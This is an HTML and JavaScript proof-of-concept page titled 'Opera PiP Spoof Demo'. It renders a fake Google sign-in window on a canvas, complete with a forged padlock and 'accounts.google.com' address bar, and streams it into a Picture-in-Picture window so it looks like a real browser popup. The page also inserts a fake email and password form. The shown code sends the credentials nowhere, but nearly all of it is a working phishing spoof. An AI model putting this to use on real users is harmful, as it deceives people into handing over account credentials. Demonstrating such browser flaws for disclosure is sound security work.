<!DOCTYPE html>
<html>
<head>
  <title>Opera PiP Spoof Demo</title>
  <style>
    body { font-family: Arial, sans-serif; }
    #fake-window {
      width: 400px;
      height: 300px;
      border: 1px solid #ccc;
      background: #fff;
      display: flex;
      flex-direction: column;
    }
    #fake-addressbar {
      background: #f1f3f4;
      padding: 5px 10px;
      font-size: 14px;
      color: green;
      border-bottom: 1px solid #ccc;
    }
    #login-form {
      padding: 20px;
    }
    input {
      display: block;
      width: 90%;
      padding: 8px;
      margin: 10px auto;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      padding: 8px 12px;
      background: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h2>Opera PiP Spoof Demo</h2>
  <button onclick="launchFake()">Launch Fake Google Login</button>

  <video id="pip-video" controls style="display:none;"></video>

  <template id="spoof-template">
    <div id="fake-window">
      <div id="fake-addressbar">ðŸ”’ https://accounts.google.com</div>
      <div id="login-form">
        <h3>Sign in</h3>
        <input type="email" placeholder="Email or phone">
        <input type="password" placeholder="Enter your password">
        <button>Next</button>
      </div>
    </div>
  </template>

  <script>
    async function launchFake() {
      let video = document.getElementById('pip-video');
      let canvas = document.createElement('canvas');
      canvas.width = 400;
      canvas.height = 300;
      let ctx = canvas.getContext('2d');

      // Render HTML into canvas (simplified spoof)
      let spoof = document.getElementById('spoof-template').content.cloneNode(true);
      document.body.appendChild(spoof);

      // Trick: Stream canvas into PiP
      let stream = canvas.captureStream();
      video.srcObject = stream;

      // Animate fake PiP
      setInterval(() => {
        ctx.fillStyle = "#fff";
        ctx.fillRect(0,0,400,300);
        ctx.fillStyle = "green";
        ctx.font = "14px Arial";
        ctx.fillText("ðŸ”’ https://accounts.google.com", 10, 20);
        ctx.fillStyle = "black";
        ctx.fillText("Sign in", 160, 60);
        ctx.fillText("Email or phone:", 20, 100);
        ctx.fillText("Password:", 20, 150);
        ctx.fillStyle = "#1a73e8";
        ctx.fillRect(150, 200, 100, 30);
        ctx.fillStyle = "#fff";
        ctx.fillText("Next", 180, 220);
      }, 500);

      try {
        await video.requestPictureInPicture();
      } catch (err) {
        alert("PiP not supported: " + err);
      }
    }
  </script>
</body>
</html>
